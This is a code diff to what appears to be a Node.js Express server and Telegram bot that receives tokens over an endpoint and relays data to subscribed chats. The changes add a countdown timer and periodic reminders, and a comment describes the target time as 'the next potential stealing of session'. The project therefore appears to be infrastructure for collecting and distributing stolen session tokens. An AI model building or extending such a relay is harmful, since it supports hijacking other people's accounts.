@@ -8,7 +8,7 @@ var cors = require("cors");
 
 //* SETUP
 const port = 6969; // app port
-const API_KEY_BOT = process.env.API_KEY_BOT; // import telegram bot api token
+const API_KEY_BOT = process.env.BOT_TOKEN; // import telegram bot api token
 
 // array of bot's chatId's, that will recieve data.
 // by default, bot adds your chatId on any message in chat and looses it on every server reboot
@@ -33,6 +33,26 @@ let prayer = `о великий павел дуров
 да сделаешь так, чтобы мир объединялся вновь  
 
 аминь`;
+
+function getNextDate() {
+  let date = new Date();
+  let day = date.getDay(),
+    add = 0;
+
+  if (new Date().getHours() > 17) add = 1;
+  if (day === 0) add += 1;
+  else if (day === 6) add += 2;
+  date.setHours(17, 0, 0, 0);
+  date.setDate(date.getDate() + add);
+
+  var distance = date.getTime() - new Date().getTime();
+  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours =
+    Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)) +
+    days * 24;
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  return { hours, minutes };
+}
 
 //* INIT
 const app = express();
@@ -71,6 +91,11 @@ bot.on("text", async (msg) => {
       "https://static.independent.co.uk/s3fs-public/thumbnails/image/2019/06/06/15/telegram-founder-pavel-durov-diet-fast.jpeg",
       { caption: prayer }
     );
+  } else if (msg.text === "/t") {
+    // get time to the next potential stealing of session
+
+    let d = getNextDate();
+    bot.sendMessage(msg.chat.id, `t-${d.hours}:${d.minutes}`);
   } else {
     //add user to array of chatId's, if not already there. on any message
     if (!botIds.includes(chatId)) {
@@ -107,6 +132,23 @@ bot.on("callback_query", (msg) => {
   );
   bot.deleteMessage(msg.message.chat.id, msg.message.message_id);
 });
+
+// remind if 59/30/15/5 minutes left!
+
+setInterval(() => {
+  let d = getNextDate();
+  if (
+    d.hours === 0 &&
+    (d.minutes === 59 ||
+      d.minutes === 30 ||
+      d.minutes === 15 ||
+      d.minutes === 5)
+  ) {
+    botIds.forEach((e) => {
+      bot.sendMessage(e, `t-${d.hours}:${d.minutes}`);
+    });
+  }
+}, 15000);
 
 //* EXPRESS ENDPOINT
 // recieve token
